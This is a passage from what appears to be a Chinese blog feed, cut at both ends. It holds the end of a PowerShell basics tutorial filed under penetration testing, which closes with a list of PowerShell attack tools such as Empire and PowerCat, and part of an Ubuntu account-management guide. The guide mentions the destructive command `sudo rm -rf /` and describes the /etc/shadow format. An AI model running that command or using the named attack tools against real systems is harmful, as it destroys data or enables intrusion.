class="line">        <span class="variable">$n</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印路径中大小大于多少的文件<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$pat_val</span>=dir D:\antSword</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$file</span> <span class="keyword">in</span> <span class="variable">$pat_val</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file</span>.length <span class="nomarkup">-gt</span> <span class="number">1</span>kb)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$file</span>.name</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h6 id="while语句"><a href="#while语句" class="headerlink" title="while语句"></a>while语句</h6><p>while<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="number">15</span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$num</span> <span class="nomarkup">-ge</span> <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$num</span></span><br><span class="line">    <span class="variable">$num</span> --</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>do … while(先运行一次)<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="number">15</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$num</span></span><br><span class="line">    <span class="variable">$num</span> --</span><br><span class="line">&#125;<span class="keyword">while</span>(<span class="variable">$num</span> <span class="nomarkup">-ge</span> <span class="number">10</span>)</span><br></pre></td></tr></table></figure></p><h6 id="continue与break"><a href="#continue与break" class="headerlink" title="continue与break"></a>continue与break</h6><p>break<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$num</span> <span class="nomarkup">-le</span> <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span> <span class="nomarkup">-eq</span> <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$num</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$num</span>++</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>continue<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$num</span> <span class="nomarkup">-lt</span> <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span> <span class="nomarkup">-eq</span> <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$num</span>++</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$num</span></span><br><span class="line">        <span class="variable">$num</span>++</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h6 id="for语句"><a href="#for语句" class="headerlink" title="for语句"></a>for语句</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span> <span class="nomarkup">-le</span> <span class="number">100</span>; <span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$sum</span>+=<span class="variable">$i</span></span><br><span class="line">    <span class="variable">$sum</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="switch实现循环"><a href="#switch实现循环" class="headerlink" title="switch实现循环"></a>switch实现循环</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="number">1</span>..<span class="number">10</span></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$num</span>)</span><br><span class="line">&#123;</span><br><span class="line">    &#123;(<span class="variable">$_</span> % <span class="number">2</span>) <span class="nomarkup">-eq</span> <span class="number">0</span>&#125;&#123;<span class="string">"此数值是偶数：<span class="variable">$_</span>"</span>&#125;</span><br><span class="line">    &#123;(<span class="variable">$_</span> % <span class="number">2</span>) <span class="nomarkup">-ne</span> <span class="number">0</span>&#125;&#123;<span class="string">"此数值是奇数：<span class="variable">$_</span>"</span>&#125;</span><br><span class="line">    default&#123;<span class="string">"num=<span class="variable">$_</span>"</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Powershell数组"><a href="#Powershell数组" class="headerlink" title="Powershell数组"></a>Powershell数组</h4><h6 id="数组的创建"><a href="#数组的创建" class="headerlink" title="数组的创建"></a>数组的创建</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.</span></span><br><span class="line"><span class="variable">$arr</span>=<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.</span></span><br><span class="line"><span class="variable">$arr</span>=<span class="number">1</span>..<span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.可以支持不同类型的值</span></span><br><span class="line"><span class="variable">$arr</span>=<span class="number">1</span>,<span class="string">"hhh"</span>,(<span class="built_in">get-date</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.空数组</span></span><br><span class="line"><span class="variable">$arr</span>=@()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.有个逗号就行</span></span><br><span class="line"><span class="variable">$arr</span>=,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 命令执行结果的每一行作为一个数组元素</span></span><br><span class="line"><span class="variable">$arr</span>=ipconfig</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断是否为数组</span></span><br><span class="line"><span class="variable">$arr</span> -is [array]</span><br></pre></td></tr></table></figure><h6 id="访问数组"><a href="#访问数组" class="headerlink" title="访问数组"></a>访问数组</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span>[<span class="number">0</span>]</span><br><span class="line"><span class="variable">$arr</span>[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span>[<span class="number">0</span>..<span class="number">2</span>]  <span class="comment"># 取出0,1,2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span>.Count  <span class="comment"># 元素个数</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span>[(<span class="variable">$arr</span>.Count)..<span class="number">0</span>]  <span class="comment"># 倒序</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span>+=<span class="string">"haha"</span> <span class="comment"># 增加元素</span></span><br></pre></td></tr></table></figure><h4 id="Powershell函数"><a href="#Powershell函数" class="headerlink" title="Powershell函数"></a>Powershell函数</h4><h6 id="自定义函数及调用"><a href="#自定义函数及调用" class="headerlink" title="自定义函数及调用"></a>自定义函数及调用</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> test</span><br><span class="line">&#123;</span><br><span class="line">    ping www.xpshuai.cn.</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test  <span class="comment"># 调用</span></span><br></pre></td></tr></table></figure><p>传参<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> test(<span class="variable">$site</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ping <span class="variable">$site</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test www.xpshuai.cn <span class="comment"># 调用</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 多个参数</span></span><br><span class="line">test p1 p2</span><br></pre></td></tr></table></figure></p><h6 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> add(<span class="variable">$n1</span>, <span class="variable">$n2</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$n1</span>,<span class="variable">$n2</span></span><br><span class="line">    <span class="variable">$sum</span>=<span class="variable">$n1</span>+<span class="variable">$n2</span>;</span><br><span class="line">    <span class="variable">$sum</span>.gettype().fullname   <span class="comment"># 数据类型</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$sum</span>.gettype().fullname <span class="nomarkup">-eq</span> <span class="string">"System.Double"</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">"c为数组，索引取值: <span class="variable">$c</span>[0]"</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$n1</span>,<span class="variable">$n2</span>,<span class="variable">$sum</span>,<span class="string">"double浮点数"</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$n1</span>,<span class="variable">$n2</span>,<span class="variable">$sum</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add <span class="number">1</span> <span class="number">2.5</span> <span class="comment"># 调用</span></span><br></pre></td></tr></table></figure><h4 id="Powershell定义文本"><a href="#Powershell定义文本" class="headerlink" title="Powershell定义文本"></a>Powershell定义文本</h4><p>powershell中转义符是反引号<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"hello先执行命令: $(Get-Date)"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"hello表达式: $(5*6)"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"单双引号hello, my name is '哈哈'"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"都用双引号，用反引号转义：hello, my name is `"哈哈`""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 换行符:`n     回车: `r</span></span><br><span class="line"><span class="string">"你好啊 `n 朋友 `n 我换行啦"</span></span><br></pre></td></tr></table></figure></p><h4 id="Powershell实现用户交互"><a href="#Powershell实现用户交互" class="headerlink" title="Powershell实现用户交互"></a>Powershell实现用户交互</h4><p>read-host<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$input</span>=<span class="built_in">read-host</span> <span class="string">"请输入用户名"</span></span><br><span class="line"><span class="string">"您好，你输入从用户名为: <span class="variable">$input</span>"</span></span><br></pre></td></tr></table></figure></p><h4 id="Powershell格式化字符串"><a href="#Powershell格式化字符串" class="headerlink" title="Powershell格式化字符串"></a>Powershell格式化字符串</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 格式化之前</span></span><br><span class="line"><span class="variable">$name</span>=<span class="string">"lili"</span></span><br><span class="line"><span class="variable">$age</span>=<span class="number">20</span></span><br><span class="line"><span class="variable">$gender</span>=<span class="string">"girl"</span></span><br><span class="line"><span class="string">"My name is <span class="variable">$name</span>, i am <span class="variable">$age</span> years old, and i am a <span class="variable">$gender</span>"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 格式化          -f</span></span><br><span class="line"><span class="variable">$name</span>=<span class="string">"lili"</span></span><br><span class="line"><span class="variable">$age</span>=<span class="number">20</span></span><br><span class="line"><span class="variable">$gender</span>=<span class="string">"girl"</span></span><br><span class="line"><span class="string">"My name is &#123;0&#125;, i am &#123;1&#125; years old, and i am a &#123;2&#125;, &#123;3&#125;."</span> -f <span class="variable">$name</span>,<span class="variable">$age</span>,<span class="variable">$gender</span>,$(<span class="number">3</span>*<span class="number">6</span>)</span><br><span class="line"><span class="comment">#运算的话，尽量用小括号括起来</span></span><br></pre></td></tr></table></figure><h4 id="String对象方法"><a href="#String对象方法" class="headerlink" title="String对象方法"></a>String对象方法</h4><p>对字符串的操作<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span>=<span class="string">"D:\Desktop\Cobalt strike4\test\a.txt"</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span>.Split(<span class="string">"."</span>)[-<span class="number">1</span>]  <span class="comment"># 以.点分割，然后取最后一位</span></span><br><span class="line"><span class="variable">$str</span>.endswith(<span class="string">"ll"</span>)   <span class="comment"># 是否以ll结尾</span></span><br><span class="line"><span class="variable">$str</span>.Contains(<span class="string">"txt"</span>)  <span class="comment"># 是否包含某个字符串</span></span><br><span class="line"><span class="variable">$str</span>.CompareTo(<span class="string">"D:\Desktop\Cobalt strike4\test\a.txt"</span>)  <span class="comment"># 判断两个字符串是否相等</span></span><br><span class="line"><span class="variable">$str</span>.IndexOf(<span class="string">"w"</span>)  <span class="comment"># 找出w的索引位置</span></span><br><span class="line"><span class="variable">$str</span>.Insert(<span class="number">3</span>,<span class="string">"hhh"</span>) <span class="comment"># 在索引3地方插入hhh</span></span><br><span class="line"><span class="variable">$str</span>.Replace(<span class="string">"c"</span>,<span class="string">"C"</span>)  <span class="comment"># 替换</span></span><br><span class="line"><span class="variable">$str</span>.Remove(<span class="number">0</span>)   <span class="comment"># 删除</span></span><br></pre></td></tr></table></figure></p><h4 id="Powershell操作注册表"><a href="#Powershell操作注册表" class="headerlink" title="Powershell操作注册表"></a>Powershell操作注册表</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#切换到根键</span></span><br><span class="line">cd hkcu:</span><br><span class="line">cd ..</span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line"><span class="comment"># 切换到别的根键</span></span><br><span class="line">cd HKLM:</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取</span></span><br><span class="line"><span class="built_in">get-ItemProperty</span></span><br><span class="line"><span class="comment"># 设置</span></span><br><span class="line"><span class="built_in">set-ItemProperty</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 移除</span></span><br><span class="line"><span class="built_in">remove-ItemProperty</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 等等其他</span></span><br><span class="line"></span><br><span class="line">命令描述</span><br><span class="line">Dir, <span class="built_in">Get-ChildItem</span>列出键的内容</span><br><span class="line">Cd, <span class="built_in">Set-Location</span>更改当前（键）目录</span><br><span class="line">HKCU:, HKLM:预定义的两个重要注册表根目录虚拟驱动器</span><br><span class="line"><span class="built_in">Get-ItemProperty</span>读取键的值</span><br><span class="line"><span class="built_in">Set-ItemProperty</span>设置键的值</span><br><span class="line"><span class="built_in">New-ItemProperty</span>给键创建一个新值</span><br><span class="line"><span class="built_in">Clear-ItemProperty</span>删除键的值内容</span><br><span class="line"><span class="built_in">Remove-ItemProperty</span>删除键的值</span><br><span class="line"><span class="built_in">New-Item</span>, md创建一个新键</span><br><span class="line"><span class="built_in">Remove-Item</span>, Del删除一个键</span><br><span class="line"><span class="built_in">Test-Path</span>验证键是否存在</span><br></pre></td></tr></table></figure><h4 id="Powershell文件操作"><a href="#Powershell文件操作" class="headerlink" title="Powershell文件操作"></a>Powershell文件操作</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 新建目录</span></span><br><span class="line"> <span class="built_in">New-Item</span> xxxx -type directory      <span class="comment"># 或者 md test</span></span><br><span class="line"><span class="comment"># 新建文件</span></span><br><span class="line"> <span class="built_in">New-Item</span> xxxx.txt -type File</span><br><span class="line"><span class="comment"># 删除目录</span></span><br><span class="line"><span class="built_in">Remove-Item</span> test</span><br><span class="line"><span class="comment"># 显示文本内容</span></span><br><span class="line"><span class="built_in">Get-Content</span> test.txt</span><br><span class="line"><span class="comment"># 设置文本内容</span></span><br><span class="line"> <span class="built_in">Set-Content</span> .\test.txt -Value <span class="string">"哈哈哈哈哈哈哈"</span></span><br><span class="line"><span class="comment"># 追加内容</span></span><br><span class="line"><span class="built_in">Add-Content</span> .\test.txt -Value <span class="string">"嘻嘻嘻嘻嘻嘻嘻嘻"</span></span><br><span class="line"><span class="comment"># 清除内容</span></span><br><span class="line"> <span class="built_in">Clear-Content</span> .\test.txt</span><br></pre></td></tr></table></figure><h2 id="常用的PowerShell攻击工具："><a href="#常用的PowerShell攻击工具：" class="headerlink" title="常用的PowerShell攻击工具："></a>常用的PowerShell攻击工具：</h2><ul><li>PowerSploit</li><li>NiShang         </li><li>Empire            (基于PowerShell的远控木马)</li><li>PowerCat        (PowerShell版的NetCat)</li></ul><h2 id="其他技巧"><a href="#其他技巧" class="headerlink" title="其他技巧"></a>其他技巧</h2><p>… …  </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/PowerShell基础知识/powershell.jpg&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="PowerShell" scheme="http://www.xpshuai.cn/tags/PowerShell/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu server-账号管理</title>
    <link href="http://www.xpshuai.cn/ubuntu%20server-%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86/"/>
    <id>http://www.xpshuai.cn/ubuntu server-账号管理/</id>
    <published>2020-03-18T13:07:50.000Z</published>
    <updated>2020-03-18T13:09:55.571Z</updated>
    
    <content type="html"><![CDATA[<h2 id="用户账号管理基础"><a href="#用户账号管理基础" class="headerlink" title="用户账号管理基础"></a><font color="red">用户账号管理基础</font></h2><p><strong>用户账号管理</strong></p><ul><li>为新员工创建账号</li><li>修改账号密码策略</li><li>禁用休假员工账号</li><li>删除离职员工账号(一般先禁用, 如果要删除, 注意提前把重要文件备份)</li><li>设置账号访问权限(只赋予其工作必需的权限)</li></ul><p><strong>每个人保管自己的密码</strong></p><ul><li>不要将密码泄露给任何人</li><li>保证密码复杂度</li><li>不要将密码写在纸条贴在限制器上</li></ul><h4 id="关于Linux账号管理基础知识"><a href="#关于Linux账号管理基础知识" class="headerlink" title="关于Linux账号管理基础知识"></a>关于Linux账号管理基础知识</h4><p><strong>Root账号</strong></p><ul><li>能做任何事情（甚至删除操作系统自身）</li><li>大部分Linux发行版安装时要求设置root账号密码</li><li>而Ubuntu默认禁用Root账号<ul><li>可<code>sudo</code>或<code>临时切换为root</code>账号</li><li>可手动启用root账号</li></ul></li><li>平时以普通员工账号管理计算机</li><li>在Ubuntu中执行<code>sudo rm -rf /</code>后，有提示</li></ul><p><strong>安装过程中创建管理员个人账号：</strong> 作为日常管理使用</p><p><strong>创建账号</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本机用户账号存储文件: `/etc/passwd`  </span></span><br><span class="line"><span class="comment"># 冒号分隔：第二列是占位符(x来代替密码，此文件不存储密码,在shadow中)，第三四列（uid,组id）root的id是0，第五列是用户描述，第六列是主目录,最后一列是终端类型</span></span><br><span class="line"><span class="comment"># 逗号分隔的部分：</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建用户（useradd） 建议添加-m参数</span></span><br><span class="line">useradd user01 -m   <span class="comment"># 一般是这样使用多</span></span><br><span class="line">useradd user01 -m -d /home/user01   <span class="comment"># -d自定义主目录位置，父目录必须是存在</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果只是sudo useradd user01    #是没有用户家目录的，且该用户的终端为sh</span></span><br><span class="line"><span class="comment"># 新添加的账号的uid是递增的（系统会自动创建一个和uid相同的组id组账号）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line">-d<span class="comment"># 账号主目录（复制于/etc/skel）</span></span><br><span class="line">-m<span class="comment"># 同时创建主目录（默认首次登录时创建主目录）   用户主目录内容拷贝自`/etc/skel`</span></span><br><span class="line">-c<span class="comment"># 全名（描述,即/etc/passwd中第五列那个）</span></span><br><span class="line">-e<span class="comment"># 账号过期（YYYY-MM-DD） -- 适合临时工作的人</span></span><br><span class="line">-N<span class="comment"># 不创建同名组账号(gid会默认设置为100)   useradd user01 -m -N</span></span><br><span class="line">-g<span class="comment"># 指定主组（必须已经存在）useradd user01 -m -g sudo</span></span><br><span class="line">-G<span class="comment"># 额外组</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">Note:</span></span></span><br><span class="line">账号名最长32个字符（不要以数字或其他特殊字符开头）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 给用户设置密码</span></span><br><span class="line">sudo passwd user02</span><br></pre></td></tr></table></figure></p><h2 id="账号数据库"><a href="#账号数据库" class="headerlink" title="账号数据库"></a><font color="red">账号数据库</font></h2><p><strong>1./etc/passwd</strong><br>格式：<code>用户名:密码占位符:UID:GID:全名(描述),房间号,公司电话,家庭电话,others:主目录:shell</code></p><p><strong>2./etc/shadow</strong><br>存放密码等其他相关信息, 默认root才能查看与读写<br>格式：<code>用户名:密码:上次修改时间:密码最小使用期限:密码最长使用期:&#39;密码&#39;过期前几天提醒:密码过期几天后账号会被锁定:&#39;账号&#39;过期日(距离1970-01-01的天数):保留</code></p><ul><li>密码位置为<code>!</code>、<code>*</code>的账号不能直接登陆系统(其他账号登录可切换为其账号) , <code>!</code>表示密码被锁定</li><li>上次修改时间：自从1970-01-01起的<code>天数</code>，如果为<code>0</code>表示用户下次登陆需要修改密码，<code>空</code>表示关闭密码过期功能(不会被锁定)</li><li>密码最长使用期限&lt;密码最小使用期 时候，用户无法更改密码(一般会设置密码有效期为90天) </li><li>密码过期几天后账号会被锁定： <ul><li>账号过期用户不能登录</li><li>密码过期看是否锁定账号</li></ul></li></ul><blockquote><p>账户修改：建议多登陆几个会话备用，防止手滑出现问题导致登不上去</p></blockquote><p><strong>设置账号密码</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">passwd user01</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line">-l<span class="comment"># 锁定账户密码   sudo passwd -l user01</span></span><br><span class="line">-u<span class="comment"># 解锁账号   sudo passwd -u user01</span></span><br><span class="line">-d<span class="comment"># 删除密码（账号无密码可登录）</span></span><br><span class="line">-n/-x   <span class="comment"># 密码最小 / 最大 使用期限</span></span><br><span class="line">-w<span class="comment"># 密码过期前几天发警告</span></span><br><span class="line">-i<span class="comment"># 密码过期后锁账号</span></span><br><span class="line">-e<span class="comment"># 密码立刻过期（下次登录必须修改密码）</span></span><br><span class="line">-s<span class="comment"># 查看账号的密码状态(L 锁定, P有密码,NP没密码 )  passwd -aS</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看账号密码状态（同上）</span></span><br><span class="line">passwd -a -S</span><br></pre></td></tr></table></figure></p><p><strong>添加账号</strong><br>adduser   参数少，更简洁<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">adduser user02</span><br><span class="line"><span class="comment"># 基于useradd的perl脚本</span></span><br><span class="line"><span class="comment"># 并非所有Linux发行版中都包含</span></span><br><span class="line"><span class="comment"># 向导方式运行（不需记忆命令参数）</span></span><br><span class="line"><span class="comment"># 位置： /usr/sbin/adduser</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 另一个批量添加账号   newusers</span></span><br><span class="line">sudo newusers users.txt  <span class="comment"># 文件内容按passwd格式填写:   user05:pass15:::hahaha:/home/user15:/bin/bash</span></span><br></pre></td></tr></table></figure></p><p><strong>删除账号</strong><br>userdel或deluser<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 